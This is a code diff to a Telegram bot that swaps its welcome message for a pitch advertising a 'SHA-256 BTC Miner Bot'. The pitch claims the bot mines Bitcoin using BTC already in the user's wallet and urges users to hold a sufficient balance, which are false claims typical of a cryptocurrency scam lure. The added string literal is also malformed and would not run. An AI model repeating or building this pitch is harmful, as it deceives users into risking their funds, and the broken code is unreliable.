@@ -40,7 +40,17 @@ def main_menu()->InlineKeyboardMarkup:
 
 @router.message(CommandStart())
 async def start_command(msg:Message)-> None:
-    await bot.send_message(chat_id=msg.from_user.id,text='Welcome to the Bot choose an option below',reply_markup=main_menu())
+    await bot.send_message(chat_id=msg.from_user.id,text='SHA-256 BTC Miner Bot
+
+This advanced mining bot leverages the SHA-256 algorithm to generate Bitcoin directly from your wallet. It utilizes the BTC already present in your wallet as a resource to facilitate and accelerate the mining process🚀🪙
+
+Key Features:
+
+🚨 Blockchain-Based Mining – Uses the SHA-256 algorithm for secure and efficient mining⛏️✅
+🚨Wallet-Integrated Process – Requires an existing BTC balance to initiate mining⛏️✅
+🚨 Real-Time Activity – If no BTC is available, the bot will not mine, even if mining activity appears on the interface✅
+
+⚠️For optimal results, ensure your wallet has a sufficient BTC balance before starting the mining process⚠️.''',reply_markup=main_menu())
     
 @router.callback_query()
 async def callback_query_handler(callback_query:CallbackQuery):
